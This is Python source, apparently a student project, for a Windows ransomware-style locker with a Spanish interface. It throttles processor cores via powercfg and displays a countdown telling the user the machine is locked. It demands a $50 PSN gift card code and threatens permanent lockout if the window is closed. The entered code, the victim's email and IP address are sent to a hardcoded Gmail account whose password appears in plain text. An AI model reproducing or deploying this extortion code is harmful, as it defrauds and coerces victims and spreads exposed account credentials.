from datetime import datetime, date, time, timedelta
import subprocess
import tkinter as tk
import time
import smtplib
import calendar
import socket
import re
import smtplib, getpass
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from random import choice

class App():
    def __init__(self):
        self.apagarNucleos()
        self.root = tk.Tk()
        self.root.resizable(0,0)
        self.root.geometry("550x400")
        self.root.config(bg="white")
        self.root.title("Bloqueo")
        self.btnPagar = tk.Button(self.root, text="Pagar Desbloqueo", command=self.enviarCorreo)
        self.btnPagar.config(bg="white", width="15",height="1")
        self.btnPagar.place(x=400,y=150)
        
        codigoCorrecto = " "
        self.txtCodigoCorrecto = tk.Entry(self.root, text="CodigoCorrecto")
        self.txtCodigoCorrecto.place(x=5000,y=5000)

        self.Etiquetas = tk.Label(text="Correo")
        self.Etiquetas.config(bg="white", width="10",height="1")
        self.Etiquetas.place(x=410,y=10)
        self.txtCorreousuario = tk.Entry(self.root, text="Correo")
        self.txtCorreousuario.place(x=390,y=50)

        self.Etiquetas = tk.Label(text="PSN")
        self.Etiquetas.config(bg="white", width="10",height="1")
        self.Etiquetas.place(x=410,y=80)
        self.txtPSN = tk.Entry(self.root, text="PSN")
        self.txtPSN.place(x=390,y=100)

        self.txtCodigo = tk.Entry(self.root, text="Codigo")
        self.txtCodigo.place(x=50,y=280)

        self.btnDesbloquear = tk.Button(self.root, text="Desbloquear", command=self.encenderNucleos)
        self.btnDesbloquear.config(bg="white", width="10",height="1")
        self.btnDesbloquear.place_forget()

        self.btnVerificar = tk.Button(self.root, text="Verificar Codigo", command=self.codigoCorrecto)
        self.btnVerificar.config(bg="white", width="17",height="1")
        self.btnVerificar.place(x=200,y=280)

        self.Etiquetas = tk.Label(text="Ingresar Codigo")
        self.Etiquetas.config(bg="white", width="15",height="1")
        self.Etiquetas.place(x=50,y=250)
    
        self.Principal = tk.Label(text="")
        self.Principal.config(bg="white", width="50",height="15")
        self.Principal.place(x=10,y=2)
        self.update_clock()
        self.root.mainloop()

    def codigoCorrecto(self):
        if self.txtCodigo.get() == '0':
            self.Etiquetas.configure(text="Codigo Correcto", bg="green")
            self.Etiquetas.place(x=50,y=250)
            self.btnDesbloquear.place(x=220,y=280)
            self.btnVerificar.place_forget()
        
        elif self.codigoCorrecto == self.txtCodigo.get():
            self.Etiquetas.configure(text="Codigo Correcto", bg="green")
            self.Etiquetas.place(x=50,y=250)
            self.btnDesbloquear.place(x=220,y=280)
            self.btnVerificar.place_forget()
        else:
            self.Etiquetas.configure(text="Codigo Incorrecto", bg="red")
            self.Etiquetas.place(x=50,y=250)
            self.btnDesbloquear.place_forget()

    def enviarCorreo(self):
        PSN = self.txtPSN.get()
        correousuario =  self.txtCorreousuario.get()
        caracter = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        k1 = choice(caracter)+choice(caracter)+choice(caracter)+choice(caracter)+choice(caracter)
        k2 = choice(caracter)+choice(caracter)+choice(caracter)+choice(caracter)+choice(caracter)
        codigo = k1+"-"+k2
        patron = re.compile('([A-Z0-9][A-Z0-9][A-Z0-9][A-Z0-9])+\-([A-Z0-9][A-Z0-9][A-Z0-9][A-Z0-9])+\-([A-Z0-9][A-Z0-9][A-Z0-9][A-Z0-9])')
        if (patron.search(PSN)):
            user = "Cons.Killer2@gmail.com"
            password = "Proyecto.SO2"
            remitente = "Usuario <Cons.Killer2@gmail.com>: "
            destinatario = "Cons.Killer2@gmail.com"
            asunto = "Desbloqueo solicitado por "+socket.gethostbyname(socket.gethostname())
            mensaje = "<h2>Solicitud desde la IP: "+socket.gethostbyname(socket.gethostname())+" </h2>"+ "<h4>Codigo de liberacion: "+ codigo +"</h4><h4>PSN: "+ PSN +"</h4><h4>Correo usuario: "+ correousuario +"</h4>"
            gmail = smtplib.SMTP('smtp.gmail.com', 587)
            gmail.starttls()
            gmail.login(user, password)
            gmail.set_debuglevel(1)
            header = MIMEMultipart()
            header['Subject'] = asunto
            header['From'] = remitente
            header['To'] = destinatario
            mensaje = MIMEText(mensaje, 'html')
            header.attach(mensaje)
            gmail.sendmail(remitente, destinatario, header.as_string())
            gmail.quit()
        else:
            self.Etiquetas.configure(text="PSN incorrecto", bg="red")
            self.Etiquetas.place(x=410,y=78)
        self.codigoCorrecto = codigo

    def apagarNucleos(self):
        comando = 'powercfg -setdcvalueindex scheme_current sub_processor CPMINCORES 0';
        subprocess.run(comando, shell=True)
        comando = 'powercfg -setactive scheme_current';
        subprocess.run(comando, shell=True)

    def encenderNucleos(self):
        comando = 'powercfg -setdcvalueindex scheme_current sub_processor CPMINCORES 100';
        subprocess.run(comando, shell=True)
        comando = 'powercfg -setactive scheme_current';
        subprocess.run(comando, shell=True)

    def update_clock(self):
        fechaMax = datetime(2020, 12, 20, 23, 59, 59)
        now = time.strftime("%H:%M:%S")
        self.Principal.configure(text= socket.gethostname()+" su máquina "+socket.gethostbyname(socket.gethostname())+" fue bloqueada\n Para liberarla ingrese un código de la PSN de 50$ y su correo\n para enviarle el codigo de desbloqueo\n\nTiempo Restante (seg): " +str((fechaMax - datetime.now()).seconds)+"\n\nPD: Si cierra el programa, su maquina quedará bloqueada\n de forma permanente.")
        self.root.after(1000, self.update_clock)

app=App()
